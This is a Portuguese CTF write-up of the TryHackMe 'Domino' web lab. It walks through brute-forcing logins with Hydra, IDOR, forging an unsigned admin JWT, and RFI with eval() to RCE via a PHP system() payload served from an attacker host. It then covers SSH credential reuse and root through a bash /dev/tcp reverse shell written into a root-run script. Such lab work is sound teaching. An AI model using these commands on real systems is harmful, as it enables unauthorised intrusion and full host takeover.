# TryHackMe — Domino (Web / CTF Writeup)

> **Disclaimer**
> Writeup educacional de um laboratório controlado (TryHackMe).
> **Flags** foram substituídas por `<FLAG_N>` e **IPs** por `<TARGET_IP>` / `<ATTACKER_IP>`.
> Credenciais e segredos exibidos são **específicos da instância do laboratório** e não têm valor fora dele.
> Não use estas técnicas em sistemas sem autorização explícita.

---

## Sumário

1. [Visão Geral](#visão-geral)
2. [Ferramentas](#ferramentas)
3. [Reconhecimento](#reconhecimento)
4. [Enumeração Web](#enumeração-web)
5. [Análise de Arquivos Estáticos](#análise-de-arquivos-estáticos)
6. [Flag 1 — IDOR](#flag-1--idor)
7. [Flag 2 — JWT Forgery](#flag-2--jwt-forgery)
8. [Flag 3 — RFI + eval() → RCE](#flag-3--rfi--eval--rce)
9. [Flag 4 — Reuso de Credencial → SSH](#flag-4--reuso-de-credencial--ssh)
10. [Flag 5 — Script World-Writable → Root](#flag-5--script-world-writable--root)
11. [Lições Aprendidas](#lições-aprendidas)
12. [Remediação](#remediação)
13. [Referências](#referências)

---

## Visão Geral

**Domino** é um laboratório web que encadeia cinco vulnerabilidades clássicas até o comprometimento total do host:

Cada flag abre a porta da próxima, num fluxo típico de pentest web: **enumeração → auth bypass → RCE → privesc lateral → privesc vertical**.

| Flag | Onde estava | Vetor |
|------|-------------|-------|
| 1 | `notes` de um usuário admin | IDOR em `/api/users/profile.php?id=` |
| 2 | Painel `/admin/` | JWT forjado (`role: admin`) |
| 3 | `/opt/flag3.txt` | RFI + `eval()` no `files.php` → RCE `www-data` |
| 4 | `/home/devops/flag4.txt` | Reuso de credencial (MySQL → SSH) |
| 5 | `/root/root.txt` | Script `774` executado por root → reverse shell |

---

## Ferramentas

| Ferramenta | Uso |
|------------|-----|
| `nmap` | Recon de portas e serviços |
| `gobuster` / `ffuf` | Enumeração de diretórios e brute-force |
| `hydra` | Brute-force de login HTTP POST |
| `curl` | Requisições manuais e PoCs |
| `Burp Suite` | Interceptação, Repeater, Intruder |
| `python3` | Forja de JWT, forge de cookie, decrypt AES |
| `pycryptodome` | Descriptografia AES-128-ECB |
| `ssh` | Acesso lateral como `devops` |
| `netcat` | Listener para reverse shell |

---

## Reconhecimento
---
### Scan de portas
```bash
nmap -sV -sC <TARGET_IP>

+ Resultado:
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.58 (Ubuntu)

Noto : Apenas dois serviços exposto. O ssh será útil na fase de privesc lateral (flag 4).

### Análise do site
---
  	http://<TARGET_IP>:80 serve o portal NexusCorp com:
  			 - Pagina de login (index.php)
   			 - Forgot password (forgot.php)
   			 - Out team (team.php) - Lista nomes e e-mails de funiconarios

Nota : Os e-mails seguem o padrão firstname.lastname@nexus.corp, o que já nos dá uma lista de potenciais usernames:

1. laura.hayes
2. michael.chen
3. robert.wilson
4. sarah.johnson
5. emma.taylor
6. david.brown
7. james.wright
---
### Enumeração Web 
---

+ Descoberta de diretórios 
gobuster dir -u http://<TARGET_IP>/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt

+ Resultado relevante : 

403.php              (200)
admin                (301 → /admin/)
api                  (301 → /api/)
auth.php             (200, size 0)
backup               (301 → /backup/)
config.php           (200, size 0)
dashboard.php        (302 → /index.php)
forgot.php           (200)
index.php            (200)
javascript           (301 → /javascript/)
logout.php           (302 → /index.php)
server-status        (403)
static               (301 → /static/)
support              (301 → /support/)
team.php             (200)


+ Análise de cada endpoint
	- /config.php -> Retorna vazio (executa PHP, não vaza código);
	- /admin	404 -> sem autenticação — só admin acessa
  -	/dashboard.php ->	Redireciona para index.php se não logado
	- /backup/ -> Contém README.txt e config.enc
  -	/static/ ->	Contém app.js e style.css
  - /support/	-> Redireciona para login
	- /team.php	-> Lista pública de funcionários

Nota: Os diretórios /backup/ e /static/ são baixáveis — sempre baixe e leia arquivos estáticos: costumam ter chaves, endpoints e comentários de deploy.

---

+ Análise de Arquivos Estáticos :

wget http://<TARGET_IP>/backup/README.txt
wget http://<TARGET_IP>/backup/config.enc
wget http://<TARGET_IP>/static/app.js

+ Contiudo dos arquivos 

- README.TXT
config.enc — Encrypted application configuration (AES-128-ECB)
Decryption key reference: see static/app.js (deployment notes)

- app.js (trecho)
const CONFIG = {
    apiBase: '/api',
    // Encryption key for backup config decryption - AES-ECB-128
    _backupKey: '<********?>',   // pad to 16 bytes
    appVersion: '2.3.1'
};

Nota : Chave encontrada em arquivo estático público. A chave que deveria proteger o backup está no front-end, acessível a qualquer visitante.

### Descriptografia do config.enc
---

O README.txt indica AES-128-ECB. ECB é inseguro porque blocos iguais de plaintext geram blocos iguais de ciphertext — mas aqui o problema nem é o modo, é a chave exposta.


+ Scritp Python : 

from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

key = b'<********?>'  # 16 bytes = AES-128
data = open('config.enc', 'rb').read()

cipher = AES.new(key, AES.MODE_ECB)
plaintext = unpad(cipher.decrypt(data), 16)
print(plaintext.decode())

+ Contéudo :
{
  "app_name": "NexusCorp Portal",
  "version": "2.3.1",
  "deploy_env": "production",
  "system_user": "devops"
}

Obervação :  O campo system_user: devops confirma um usuário do sistema chamado devops — informação crucial para a Flag 4.
Nota : README, *.enc, *.bak, app.js e config.* são fontes de ouro para credenciais. Sempre enumere /backup/, /static/, /js/, /assets/ e baixe tudo.

---

+ Resumo : 
  Como toda essa informação foi feito um teste de Brute-force de login usando o HYDRA com a lista de usuários encontrado e as senhas do rockyou.txt

hydra -L users -P rockyou.txt -s 80 <TARGET_IP> \
  http-post-form '/index.php:username=^USER^&password=^PASS^:F=Invalid credentials'

+ Resultado : 

laura.hayes    : <vazio>
michael.chen   : <vazio>
james.wright   : <vazio>
david.brown    : <vazio>
robert.wilson  : <*******> ?
emma.taylor    : <*******> ?
sarah.johnson  : <*******> ?

Obervação : Três contas com a mesma senha (<*******>) — sinal de política fraca.

## Flag 1 Idor 
---
### Login e descoberta de endpoint
---
Após encontrar a senha foi logado na conta do robert.wilson, e exposto:

+ dashboard
File Viewer — /api/files.php?name=
File Viewer — /api/auth/token.php
Quick Links — Support Tickets, Open Ticket, My Profile API

+ My Profile 
Ela aponta para um endpoint :
/api/users/profile.php?id=4

Observação: Após identificar esse endpoint, foram testados os valores do parâmetro id de 1 a 7 — correspondentes aos 7 usuários — utilizando o curl, com o objetivo de verificar a ocorrência de IDOR.

---
 
curl -s "http://<TARGET_IP>/api/users/profile.php?id=1" \
  -H "Cookie: nexus_session=<COOKIE_DE_ROBERT>"

+ Resulatado :

{
  "id": 1,
  "username": "laura.hayes",
  "email": "laura.hayes@nexus.corp",
  "role": "admin",
  "notes": "<FLAG_1>"
}

Observação: Esse teste permitiu identificar uma vulnerabilidade de IDOR (Insecure Direct Object Reference) no site. A Flag 1 foi obtida ao manipular o parâmetro id para 1, que correspondia à conta do administrador (laura.hayes), evidenciando que o controle de acesso não valida se o usuário autenticado tem permissão para acessar o recurso solicitado.

---
## Flag 2 JWT Fortgery
---
### Obter um token válido
---
O files.php exige jwt. O endpoint /api/auth/token.php emite tokens:

curl -s http://<TARGET_IP>/api/auth/token.php \
  -H "Content-Type: application/json" \
  -d '{"username":"robert.wilson","password":"password"}'

+ Resultado
{
  "token": "<JWT_DE_ROBERT>",
  "expires_in": 3600,
  "note": "Use this token as: Authorization: Bearer <token> for /api/files.php"
}

---

+ Decofigicar o jwt
foi colocado o token encontra no site : jwt.io

+ Resultado :
  - Header :
   { "alg": "HS256", "typ": "JWT" }
  - Payload :
  {
  "sub": "robert.wilson",
  "role": "user",
  "iat": 1793219124,
  "exp": 1793222724
  }
---

+ Forjar token admin
Como o servidor não valida a assinatura (ou aceita fakesignature como placeholder), basta alterar o payload e reencodar:

- Script python :
import base64, json

def b64(d):
    return base64.urlsafe_b64encode(
        json.dumps(d, separators=(',', ':')).encode()
    ).rstrip(b'=').decode()

header  = b64({"alg": "HS256", "typ": "JWT"})
payload = b64({"sub": "laura.hayes", "role": "admin"})

print(f"{header}.{payload}.fakesignature")

---

+ Acessar /admin/
curl -i http://<TARGET_IP>/admin/ -H "Authorization: Bearer <ADMIN_JWT>"

Observação: O painel admin responde 200 - Flag 2 confirmada pelo acesso , e a apina exibe :

File System Access
Internal document viewer via authenticated API.
GET /api/files.php?name=[path] with Bearer token

Observação : JWTs são stateless — se o servidor não valida a assinatura (HS256 com segredo fraco, alg: none, ou sem verificação), o payload pode ser editado livremente. Sempre teste alterar role, sub e user_id.

---
## Flag 3 — RFI + eval() → RCE
---

Observação: Utilizando o endpoint /api/files.php?name= com o JWT falsificado do administrador, tentou-se ler o arquivo /etc/passwd. A requisição, no entanto, foi bloqueada pela validação de caminho (realpath()), que restringe o acesso a /var/www/html/.

curl -i "http://<TARGET_IP>/api/files.php?name=../../etc/passwd" \
  -H "Authorization: Bearer <ADMIN_JWT>"

* Resultado : 
 {"error":"Access denied: path must be within /var/www/html/"}
---

### Lendo o script do arquivo file.php
---

Observação: Como o endpoint é um viewer (utiliza file_get_contents, e não include), ao solicitar um arquivo .php, o código-fonte é retornado em vez de executado:

curl -s "http://<TARGET_IP>/api/files.php?name=/var/www/html/api/files.php" \
  -H "Authorization: Bearer <ADMIN_JWT>"

+ Trecho crucial : 

// RFI: fetch remote URL and eval as PHP (allow_url_fopen enabled)
if (strpos($name, "http://") === 0 || strpos($name, "https://") === 0) {
    $remote = @file_get_contents($name);
    if ($remote === false) {
        http_response_code(502);
        echo json_encode(["error" => "Could not fetch remote file"]);
        exit;                                 // ← sai AQUI
    }
    ob_start();
    eval(str_replace("<?php", "", $remote));  // ← RCE
    $output = ob_get_clean();
    echo json_encode(["output" => $output]);
    exit;                                     // ← sai AQUI
}

// Security check: resolve real path to prevent ../ traversal
$real = realpath($name);
if ($real === false || strpos($real, '/var/www/html/') !== 0) {
    http_response_code(403);
    echo json_encode(["error" => "Access denied: path must be within /var/www/html/"]);
    exit;
}

+ Análise do fluxo :
1. RFI + eval() vem ANTES do filtro realpath. Se $name começa com http:// ou https://, o código busca o conteúdo remoto e executa como PHP — e faz exit antes de chegar na validação de path.
2. str_replace("<?php", "", $remote) remove a tag. O payload deve ser código PHP puro, sem <?php.

3. allow_url_fopen=On (o comentário do dev confirma) → file_get_contents("http://...") funciona.
---

+ Preparação do payload 
O payload deve ser enviado sem a tag <?php, pois o script a remove antes de executar o conteúdo via eval(),e o pyload deve ser feito na maquina local.
- payload:  
    echo 'system("id; ls -la /opt; cat /opt/flag3.txt");' > payload.txt

+ Servir na maquina local 
Atenção : O servidor HTTP deve ser iniciado no diretório onde o payload foi criado, para que o arquivo seja servido corretamente ao alvo.
''' python3 -m http.server 8000

+ Disparar o RFI :
curl -s -H "Authorization: Bearer <ADMIN_JWT>" \
  "http://<TARGET_IP>/api/files.php?name=http://<ATTACKER_IP>:8000/payload.txt"

+ Resultado : 

{"output":"uid=33(www-data) gid=33(www-data) groups=33(www-data)
total 28
drwxrwxrwx  5 root     root     4096 ...
-rwxrwxrwx  1 root     root     1870 admin_bot.py     ← world-writable!
-rw-r--r--  1 www-data www-data   30 flag3.txt        ← 644, www-data lê
drwxr-xr-x  2 root     root     4096 monitoring
drwxr-xr-x  2 root     root     4096 tools
<FLAG_3>"}

Nota: Sempre que encontrar um arquivo, tente lê-lo. Nesse caso, o admin_bot.py é 777 (world-writable) e roda como root (veremos adiante); além disso, há um diretório monitoring

---

## Flag 4 — Reuso de Credencial → SSH
---

Observação: Para ler a Flag 4, tentei a mesma técnica utilizada para obter a Flag 3, mas o resultado foi diferente — a leitura foi bloqueada por permissão (Permission denied), como mostrado a seguir:
- payload: 
    echo 'system("cat /home/devops/flag4.txt 2>&1");' > payload.txt

+ Resultado :
   cat: /home/devops/flag4.txt: Permission denied

Observação: O diretório home do devops possui permissão 750 e a flag tem permissão 600 — ou seja, o usuário www-data não tem permissão de leitura. Portanto, é necessária uma escalada de privilégios.

---

+ lendo o admin_bot.py
Observação: o arquivo possui permissão 777, o usuário www-data pode lê-lo e escrevê-lo. A leitura é feita da seguinte forma:
- payload :
   echo 'system("cat /opt/admin_bot.py");' > payload.txt

+ Resultado : 
 DB_CONFIG = dict(host="localhost", database="nexusdb",
   user="app_user", password="*********", ...)
   APP_SECRET = "nexus_app_k3y_2024"

Nota: ******** é literalmente "DevOps". O system_user: devops (do config.enc) já tinha aparecido. Hipótese: a senha do banco é a mesma do usuário do sistema.

Tentativa via su — falha por typeahead flush: o su chama tcflush() e descarta a senha enviada por pipe.

 echo '***********' | script -q -c "su devops -c 'cat /home/devops/flag4.txt'" /dev/null
 # → su: Authentication failure  (por race condition, não por senha errada)

+ Solução mais simples : ssh direto da maquina local 
  ssh devops@<TARGET_IP>
+ ler flag 4 
cat /home/devops/flag4.txt

---

## Flag 5 — Script World-Writable → Root
---

+ Enumeração como devops
id                        # uid=1001(devops) — sem sudo, sem grupos extras
sudo -l                   # falha: devops não está em sudoers
find / -perm -4000 -type f 2>/dev/null   # apenas SUIDs padrão
find / -user root -writable -type f 2>/dev/null

+ Saida Relevante 
/opt/admin_bot.py
/opt/monitoring/health_report.sh
/var/log/nexus_health.log

---

+ Anãlise do health_report.sh
ls -la /opt/monitoring/health_report.sh
     -rwxrwxr-- 1 root devops 537 May 18 10:41 health_report.sh

+ tentativa 1 - cp da flag (flou)
cat > /opt/monitoring/health_report.sh <<'EOF'
- #!/bin/bash
cp /root/root.txt /tmp/flag5 2>/dev/null
chmod 644 /tmp/flag5 2>/dev/null
EOF

---

+ Tentativa 2 — Reverse shell (funcionou)
ouvinte : 
nc -lvnp 4444

- Obrescreber o script :
cat > /opt/monitoring/health_report.sh <<'EOF'
- #!/bin/bash
bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
EOF
+ Concetado :
cat /root/root.txt
- # → <FLAG_5>

---
## final : Thanks  